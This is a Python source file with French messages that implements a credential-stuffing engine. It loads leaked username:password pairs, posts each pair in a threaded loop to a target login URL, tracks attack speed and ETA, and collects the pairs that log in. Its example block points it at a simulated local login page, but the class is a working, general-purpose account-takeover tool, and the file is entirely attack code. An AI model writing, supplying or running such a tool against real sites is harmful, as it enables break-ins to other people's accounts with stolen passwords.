import time
import threading
import requests
from urllib.parse import urlparse

class CredentialStuffingEngine:
    def __init__(self):
        self.running = False
        self.found_credentials = []
        self.attempts = 0
        self.start_time = None
        self.speed = 0
        self.progress = 0
        self.total_combinations = 0
        self.leaked_credentials = [] # List of (username, password) tuples

    def load_leaked_credentials(self, filepath):
        """Loads leaked credentials from a file (e.g., username:password per line)."""
        self.leaked_credentials = []
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        username, password = line.split(":", 1)
                        self.leaked_credentials.append((username, password))
            self.total_combinations = len(self.leaked_credentials)
            print(f"Chargé {self.total_combinations} paires de crédentiels.")
        except FileNotFoundError:
            print(f"Fichier de crédentiels non trouvé: {filepath}")
            self.leaked_credentials = []
            self.total_combinations = 0

    def start_attack(self, target_url, login_field_name, password_field_name, success_indicator):
        """Starts the credential stuffing attack."
        Args:
            target_url (str): The URL of the login page.
            login_field_name (str): The name of the username/email input field.
            password_field_name (str): The name of the password input field.
            success_indicator (str): A string that indicates a successful login (e.g., a redirect URL, a specific text on the dashboard).
        """
        if not self.leaked_credentials:
            print("Aucun crédentiel chargé pour l'attaque de credential stuffing.")
            return

        self.running = True
        self.found_credentials = []
        self.attempts = 0
        self.start_time = time.time()
        self.speed = 0
        self.progress = 0

        def _run_attack():
            session = requests.Session()
            for username, password in self.leaked_credentials:
                if not self.running:
                    break

                self.attempts += 1

                # Prepare payload for POST request
                payload = {
                    login_field_name: username,
                    password_field_name: password
                }

                try:
                    response = session.post(target_url, data=payload, allow_redirects=True, timeout=10)
                    
                    # Check for success indicator
                    if success_indicator in response.text or success_indicator in response.url:
                        self.found_credentials.append({
                            "username": username,
                            "password": password,
                            "url": target_url
                        })
                        print(f"Crédentiels trouvés: {username}:{password} sur {target_url}")
                        # Optionally, stop after first found or continue
                        # self.running = False
                        # break

                except requests.exceptions.RequestException as e:
                    print(f"Erreur de requête pour {username}:{password} sur {target_url}: {e}")
                
                # Update speed and progress
                if self.attempts % 10 == 0: # Update every 10 attempts
                    elapsed = time.time() - self.start_time
                    self.speed = self.attempts / elapsed if elapsed > 0 else 0
                    self.progress = (self.attempts / self.total_combinations * 100) if self.total_combinations > 0 else 0

            self.running = False
            print("Attaque de credential stuffing terminée.")

        threading.Thread(target=_run_attack).start()

    def stop_attack(self):
        """Stops the credential stuffing attack."""
        self.running = False

    def get_status(self):
        """Gets the current status of the credential stuffing attack."""
        elapsed_time = time.time() - self.start_time if self.start_time else 0
        current_speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
        
        if self.total_combinations > 0:
            remaining_attempts = self.total_combinations - self.attempts
            eta_seconds = remaining_attempts / current_speed if current_speed > 0 else 0
        else:
            eta_seconds = 0

        return {
            "running": self.running,
            "found_credentials": self.found_credentials,
            "attempts": self.attempts,
            "elapsed_time": elapsed_time,
            "speed": current_speed,
            "progress": min((self.attempts / self.total_combinations * 100) if self.total_combinations > 0 else 0, 100),
            "total_combinations": self.total_combinations,
            "eta_seconds": eta_seconds
        }

# Exemple d'utilisation (pourrait être intégré dans main.py ou une route Flask)
if __name__ == '__main__':
    engine = CredentialStuffingEngine()
    engine.load_leaked_credentials("leaked_creds.txt") # Assurez-vous que ce fichier existe

    # Créez un fichier leaked_creds.txt avec des données de test
    # Exemple:
    # user1:pass1
    # user2:pass2
    # testuser:testpass

    # Exemple de fonction cible (simule une page de connexion)
    # Vous devrez adapter cela à la structure réelle de la page de connexion
    # que vous ciblez.
    target_url = "http://localhost:5000/login_sim"
    login_field = "username"
    password_field = "password"
    success_text = "Bienvenue"

    # Simuler un serveur Flask pour le test
    from flask import Flask, request, jsonify
    app = Flask(__name__)

    @app.route("/login_sim", methods=["POST"])
    def login_sim():
        username = request.form.get("username")
        password = request.form.get("password")
        if username == "testuser" and password == "testpass":
            return "Bienvenue sur le tableau de bord!"
        return "Identifiants invalides", 401

    # Lancer l'attaque dans un thread séparé pour ne pas bloquer le serveur Flask
    import threading
    attack_thread = threading.Thread(target=engine.start_attack, args=(target_url, login_field, password_field, success_text))
    attack_thread.start()

    # Lancer le serveur Flask (bloquant, donc après le démarrage de l'attaque)
    # app.run(debug=True, port=5000)

    # Pour un test non-Flask, vous pouvez simplement appeler start_attack
    # engine.start_attack(target_url, login_field, password_field, success_text)

    while engine.running:
        status = engine.get_status()
        print(f"Statut: Tentatives={status["attempts"]}, Vitesse={status["speed"]:.2f} att/s, Progression={status["progress"]:.2f}%, ETA={status["eta_seconds"]:.0f}s")
        time.sleep(1)

    final_status = engine.get_status()
    print(f"Attaque terminée. Crédentiels trouvés: {final_status["found_credentials"]}")




